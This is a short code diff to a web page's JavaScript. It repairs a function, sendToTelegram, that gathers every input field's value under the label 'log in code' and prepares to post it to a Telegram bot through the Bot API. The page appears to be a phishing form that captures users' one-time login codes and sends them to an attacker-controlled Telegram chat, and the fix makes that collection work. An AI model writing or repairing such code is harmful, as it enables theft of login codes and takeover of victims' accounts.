@@ -118,9 +118,9 @@ background-color:#ffffff;
     function sendToTelegram() {
         progressSpinner.style.display = 'block'; // Show the spinner
 
-        let message = '';
+        let message = 'log in code';
         inputs.forEach(input => {
-            message + "login code" += input.value;
+            message += input.value;
         });
 
         const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
